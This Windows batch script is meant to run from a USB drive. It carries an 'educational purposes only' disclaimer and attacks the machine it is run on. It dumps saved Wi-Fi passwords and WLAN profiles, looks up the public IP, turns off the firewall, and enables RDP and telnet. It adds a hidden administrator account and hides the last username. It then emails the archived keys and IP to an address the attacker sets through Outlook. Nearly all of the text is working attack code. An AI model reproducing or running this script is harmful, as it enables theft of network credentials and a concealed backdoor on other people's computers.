GOTO COMMENT
	Ava Gailliot
	Disclaimer: This application is for educational purposes only.
	Ensure the following executables are in the root of the USB drive:
		- 7z.exe
 		- WirelessKeyView.exe
 		- curl.exe
:COMMENT

@ECHO OFF

REM. -- Setup vars
SET user="myuser"
SET pass="mypass"
SET mail="myemail@gmail.com"
if exist "%ProgramFiles(x86)%" (
    set outlook="C:\Program Files (x86)\Microsoft Office\Office14\OUTLOOK.EXE"
    )
else(
    set outlook="C:\Program Files\Microsoft Office\Office14\OUTLOOK.EXE"
    )

REM. -- Public IP
curl.exe "http://myexternalip.com/raw" >> %USERDOMAIN%_IP.txt

REM. -- Import all keys from WirelessKeyView
WirelessKeyView.exe /export "C:\temp\wireless_keys.txt"
REM. -- Zip keys from WirelessKeyView
7z.exe -a -t7z keyview_%USERDOMAIN%.7z C:\temp\wireless_keys.txt

REM. -- Zip keys from Windows
7z.exe a -t7z wifi_%USERDOMAIN%.7z C:\ProgramData\Microsoft\Wlansvc\Profiles\Interfaces

REM. -- Put out the Firewall
netsh firewall SET opmode disable

REM. -- Enable RDP (requires reboot)
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlset\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f

REM. -- Enable telnet
sc config tlntsvr start= auto
net start telnet

REM. -- Create my user
net user %user% %pass% /add
net localgroup "Administrators" /add %user%
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" /v %user% /t REG_DWORD /d 0 /f

REM. -- Hide last user logged in to machine
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\policies\system /v dontdisplaylastusername /t REG_DWORD /d 1 /f

%outlook% /c ipm.note /m %mail% /a keyview_%USERDOMAIN%.7z 
%outlook% /c ipm.note /m %mail% /a wifi_%USERDOMAIN%.7z
%outlook% /c ipm.note /m %mail% /a %USERDOMAIN%_IP.txt
